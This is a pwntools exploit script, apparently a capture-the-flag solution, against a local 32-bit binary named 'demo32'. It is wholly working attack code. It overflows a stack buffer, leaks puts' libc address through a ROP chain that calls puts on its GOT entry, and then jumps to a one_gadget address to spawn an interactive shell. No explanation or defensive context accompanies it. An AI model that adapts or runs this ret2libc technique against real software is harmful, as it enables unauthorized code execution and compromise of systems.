from pwn import *
context.log_level = "debug"
io = process("./demo32")
elf = ELF("./demo32")
libc = ELF("./libc.so.6")
io.recv()

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vul = 0x804843b
pause()
payload = b"A"*0x4c + p32(puts_plt) + p32(vul) + p32(puts_got)
io.sendline(payload)
pause()


puts_addr = u32(io.recv(4))
libc = puts_addr - 0x5fcb0
one = [0x3ac6c,0x3ac6e,0x3ac72,0x3ac79,0x5fbd5,0x5fbd6]
shell = one[0] + libc

payload2 = b"A"*0x4c + p32(shell)
io.sendline(payload2)
input()
pause()
io.interactive()
